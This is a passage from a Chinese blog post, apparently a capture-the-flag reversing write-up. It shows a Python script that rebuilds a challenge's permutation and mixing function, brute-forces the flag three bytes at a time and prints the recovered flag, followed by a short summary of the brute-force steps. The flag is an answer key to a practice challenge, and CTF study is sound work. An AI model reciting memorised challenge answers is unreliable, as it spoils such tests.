class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x76</span>, <span class="number">0x6e</span>, <span class="number">0x68</span>, <span class="number">0x6b</span>, <span class="number">0x6a</span>,</span><br><span class="line">          <span class="number">0x6c</span>, <span class="number">0x7a</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x66</span>, <span class="number">0x78</span>, <span class="number">0x67</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x35</span>, <span class="number">0x36</span>]</span><br><span class="line">table3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table1)):</span><br><span class="line">    table3.append(table2.index(table1[i]))</span><br><span class="line">print(table3)</span><br><span class="line">s = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>)]</span><br><span class="line">s[<span class="number">0</span>] = <span class="number">0xB4D8846071AC9EE5</span></span><br><span class="line">s[<span class="number">1</span>] = <span class="number">0x1E1FF00814E134FE</span></span><br><span class="line">s[<span class="number">2</span>] = <span class="number">0x6B198E7941B7002E</span></span><br><span class="line">s[<span class="number">3</span>] = <span class="number">0xBC6FA839EFE36443</span></span><br><span class="line">s[<span class="number">4</span>] = <span class="number">0xC3C71AD9A664B6C3</span></span><br><span class="line">s[<span class="number">5</span>] = <span class="number">0x5692A2F09C98D986</span></span><br><span class="line">s[<span class="number">6</span>] = <span class="number">0xF084A1A59CD01E68</span></span><br><span class="line">s[<span class="number">7</span>] = <span class="number">0xBC52E78A7E4DF2DF</span></span><br><span class="line">s[<span class="number">8</span>] = <span class="number">0xDA219D93290B91A8</span></span><br><span class="line">s[<span class="number">9</span>] = <span class="number">0x5703D0286FA5D32F</span></span><br><span class="line">s[<span class="number">10</span>] = <span class="number">0x6274B1B118DA82B2</span></span><br><span class="line">s[<span class="number">11</span>] = <span class="number">0xA746EBFB0954EBBC</span></span><br><span class="line">s[<span class="number">12</span>] = <span class="number">0x5F6DF7BD4F1967A2</span></span><br><span class="line">s[<span class="number">13</span>] = <span class="number">0x16D5B5BDEE98CF8E</span></span><br><span class="line">s[<span class="number">14</span>] = <span class="number">0x52E8B6DF7E62E39A</span></span><br><span class="line">s[<span class="number">15</span>] = <span class="number">0x99F9455FB0C8D933</span></span><br><span class="line">s[<span class="number">16</span>] = <span class="number">0x5FFD82D53AF933D</span></span><br><span class="line">s[<span class="number">17</span>] = <span class="number">0xFF9084A16FF0141C</span></span><br><span class="line">s[<span class="number">18</span>] = <span class="number">0xE17C5F0781D52F9B</span></span><br><span class="line">s[<span class="number">19</span>] = <span class="number">0x1A0F4431548E51D1</span></span><br><span class="line">s[<span class="number">20</span>] = <span class="number">0xF2E8573D8F0F01DD</span></span><br><span class="line">s[<span class="number">21</span>] = <span class="number">0x250039177F4DEF91</span></span><br><span class="line">s[<span class="number">22</span>] = <span class="number">0x8851491ECBC7AF7C</span></span><br><span class="line">s[<span class="number">23</span>] = <span class="number">0xAD427C6695B91D24</span></span><br><span class="line">s[<span class="number">24</span>] = <span class="number">0x5E0071D97D98D094</span></span><br><span class="line">s[<span class="number">25</span>] = <span class="number">0x264DDA52B0C37B03</span></span><br><span class="line">s[<span class="number">26</span>] = <span class="number">0xA5811271D6D7C428</span></span><br><span class="line">s[<span class="number">27</span>] = <span class="number">0xE0133FC719F34136</span></span><br><span class="line">s[<span class="number">28</span>] = <span class="number">0xE508ACE2412B2633</span></span><br><span class="line">s[<span class="number">29</span>] = <span class="number">0x74321A3E9FACE34C</span></span><br><span class="line">s[<span class="number">30</span>] = <span class="number">0xFF5B8A59E8EBF70B</span></span><br><span class="line">s[<span class="number">31</span>] = <span class="number">0x76275A516F88C986</span></span><br><span class="line">s[<span class="number">32</span>] = <span class="number">0x1604D76F74599CC4</span></span><br><span class="line">s[<span class="number">33</span>] = <span class="number">0xF744BCD8F2016F58</span></span><br><span class="line">s[<span class="number">34</span>] = <span class="number">0xA0B6A7A0239E4EA7</span></span><br><span class="line">s[<span class="number">35</span>] = <span class="number">0xF1EFC57F15CB9AB4</span></span><br><span class="line">s[<span class="number">36</span>] = <span class="number">0xB0D1AD4FB4ED946A</span></span><br><span class="line">s[<span class="number">37</span>] = <span class="number">0x81CA31324D48E689</span></span><br><span class="line">s[<span class="number">38</span>] = <span class="number">0xE6A9979C51869F49</span></span><br><span class="line">s[<span class="number">39</span>] = <span class="number">0xA666637EE4BC2457</span></span><br><span class="line">s[<span class="number">40</span>] = <span class="number">0x6475B6AB4884B93C</span></span><br><span class="line">s[<span class="number">41</span>] = <span class="number">0x5C033B1207DA898F</span></span><br><span class="line">s[<span class="number">42</span>] = <span class="number">0xB66DC7E0DEC3443E</span></span><br><span class="line">s[<span class="number">43</span>] = <span class="number">0xE4899C99CFA0235C</span></span><br><span class="line">s[<span class="number">44</span>] = <span class="number">0x3B7FD8D4D0DCAF6B</span></span><br><span class="line">s[<span class="number">45</span>] = <span class="number">0xB1A4690DB34A7A7C</span></span><br><span class="line">s[<span class="number">46</span>] = <span class="number">0x8041D2607129ADAB</span></span><br><span class="line">s[<span class="number">47</span>] = <span class="number">0xA6A1294A99894F1A</span></span><br><span class="line">s[<span class="number">48</span>] = <span class="number">0xDDE37A1C4524B831</span></span><br><span class="line">s[<span class="number">49</span>] = <span class="number">0x3BC8D81DE355B65C</span></span><br><span class="line">s[<span class="number">50</span>] = <span class="number">0x6C61AB15A63AD91E</span></span><br><span class="line">s[<span class="number">51</span>] = <span class="number">0x8FA4E37F4A3C7A39</span></span><br><span class="line">s[<span class="number">52</span>] = <span class="number">0x268B598404E773AF</span></span><br><span class="line">s[<span class="number">53</span>] = <span class="number">0x74F4F040AE13F867</span></span><br><span class="line">s[<span class="number">54</span>] = <span class="number">0x4DF78E91FD682404</span></span><br><span class="line">s[<span class="number">55</span>] = <span class="number">0xABE1FC425A9A671A</span></span><br><span class="line">s[<span class="number">56</span>] = <span class="number">0x1BB06615C8A31DD5</span></span><br><span class="line">s[<span class="number">57</span>] = <span class="number">0x9F56E9AEF2FA5D55</span></span><br><span class="line">s[<span class="number">58</span>] = <span class="number">0x239DCF030B3CE09B</span></span><br><span class="line">s[<span class="number">59</span>] = <span class="number">0x24556A34B61CA998</span></span><br><span class="line">x = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, <span class="string">&quot;1234567890abcdefghijklmnobqrstuv&quot;</span>))</span><br><span class="line">y = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    y[table3[i]] = x[i]</span><br><span class="line">print(<span class="built_in">bytes</span>(y))</span><br><span class="line"></span><br><span class="line">y.append(y[<span class="number">0</span>])</span><br><span class="line">y.append(y[<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 0x3c51f518c2cc9791</span></span><br><span class="line"><span class="comment"># 1b27564890a3cmofhgijlndketsrqbuv</span></span><br><span class="line"><span class="comment"># 1b27564890a3cmofhgijlndketsrqbuv</span></span><br><span class="line">v1 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">v2 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">v1[<span class="number">0</span>] = <span class="number">0x9E3779B917181920</span></span><br><span class="line">v1[<span class="number">1</span>] = <span class="number">0x9E3779B912881288</span></span><br><span class="line">v2[<span class="number">0</span>] = <span class="number">0xDEADBEEFFEEDBEEF</span></span><br><span class="line">v2[<span class="number">1</span>] = <span class="number">0x1BADB002FACECAFE</span></span><br><span class="line">v2[<span class="number">2</span>] = <span class="number">0xFEEDFACE08920892</span></span><br><span class="line">v2[<span class="number">3</span>] = <span class="number">0xCAFEFEED12401240</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">v1, v2,y</span>):</span></span><br><span class="line">    v1[<span class="number">0</span>] = (y[<span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (y[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) | y[<span class="number">0</span>] | <span class="number">0xAABBCCDD11000000</span></span><br><span class="line">    <span class="comment"># print(hex(num1))</span></span><br><span class="line">    v1_c = v1.copy()</span><br><span class="line">    v2_c = v2.copy()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        v3 = i &amp; <span class="number">3</span></span><br><span class="line">        v2_c[v3] = ((v2_c[<span class="number">0</span>] + v2_c[<span class="number">1</span>]) &amp; <span class="number">0xffffffffffffffff</span>) + (</span><br><span class="line">                ((v2_c[<span class="number">2</span>] + v2_c[<span class="number">3</span>]) &amp; <span class="number">0xffffffffffffffff</span>) ^ (v2_c[<span class="number">0</span>] &lt;&lt; (v2_c[<span class="number">2</span>] % <span class="number">64</span>)) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line">        v2_c[v3] &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">        v1_c[<span class="number">0</span>] += ((((v2_c[v3] + v1_c[<span class="number">1</span>]) &lt;&lt; <span class="number">9</span>) &amp; <span class="number">0xffffffffffffffff</span>) ^ (</span><br><span class="line">                (v2_c[v3] - v1_c[<span class="number">1</span>]) &amp; <span class="number">0xffffffffffffffff</span>) ^ (</span><br><span class="line">                            ((v2_c[v3] + v1_c[<span class="number">1</span>]) &amp; <span class="number">0xffffffffffffffff</span>) &gt;&gt; <span class="number">14</span>)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        v1_c[<span class="number">0</span>] &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">        v1_c[<span class="number">1</span>] += ((((v2_c[v3] + v1_c[<span class="number">0</span>]) &lt;&lt; <span class="number">9</span>) &amp; <span class="number">0xffffffffffffffff</span>) ^ (</span><br><span class="line">                (v2_c[v3] - v1_c[<span class="number">0</span>]) &amp; <span class="number">0xffffffffffffffff</span>) ^ (</span><br><span class="line">                            ((v2_c[v3] + v1_c[<span class="number">0</span>]) &amp; <span class="number">0xffffffffffffffff</span>) &gt;&gt; <span class="number">14</span>)) &amp; <span class="number">0xffffffffffffffff</span></span><br><span class="line">        v1_c[<span class="number">1</span>] &amp;= <span class="number">0xffffffffffffffff</span></span><br><span class="line">    <span class="keyword">return</span> v1_c[<span class="number">0</span>], v1_c[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute</span>():</span></span><br><span class="line">    y = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> b1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">0x7f</span>):</span><br><span class="line">        <span class="keyword">for</span> b2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">0x7f</span>):</span><br><span class="line">            <span class="keyword">for</span> b3 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">0x7f</span>):</span><br><span class="line">                y[<span class="number">0</span>] = b1</span><br><span class="line">                y[<span class="number">1</span>] = b2</span><br><span class="line">                y[<span class="number">2</span>] = b3</span><br><span class="line">                r1,r2 = func(v1.copy(), v2.copy(), y)</span><br><span class="line">                <span class="keyword">if</span> r1 == s[<span class="number">0</span>] <span class="keyword">and</span> r2 ==s[<span class="number">1</span>]:</span><br><span class="line">                    print(b1,b2,b3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># brute()</span></span><br><span class="line"><span class="comment"># 112 117 116</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute2</span>():</span></span><br><span class="line">    y = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">    y[<span class="number">0</span>] = <span class="number">112</span></span><br><span class="line">    y[<span class="number">1</span>] = <span class="number">117</span></span><br><span class="line">    y[<span class="number">2</span>] = <span class="number">116</span></span><br><span class="line">    y[<span class="number">30</span>] = y[<span class="number">0</span>]</span><br><span class="line">    y[<span class="number">31</span>] = y[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">0x7f</span>):</span><br><span class="line">            y[i+<span class="number">2</span>] = b</span><br><span class="line">            r1, r2 = func(v1.copy(), v2.copy(), y[i:i+<span class="number">3</span>])</span><br><span class="line">            <span class="keyword">if</span> r1 == s[<span class="number">2</span>*i+<span class="number">0</span>] <span class="keyword">and</span> r2 == s[<span class="number">2</span>*i+<span class="number">1</span>]:</span><br><span class="line">                func(v1, v2, y[i:i+<span class="number">3</span>])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(y)</span><br><span class="line">flag = brute2().decode()</span><br><span class="line"></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    ans += flag[table3[i]]</span><br><span class="line">print(ans)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ptm&#123;5m0l_chunk5_5m0l_53cur17y&#125;pu</span></span><br></pre></td></tr></table></figure>
<p>总结一下爆破的步骤吧</p>
<ol>
<li>恢复代码，定义为函数func，返回要比对的值</li>
<li>开始爆破，for循环嵌套，之后赋值，赋值后调用func，<strong>参数都是副本</strong></li>
<li>比对结果，结果正确就记录，<strong>并且把真正参数传入func进行一次迭代</strong>，看情况退出</li>
</ol>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>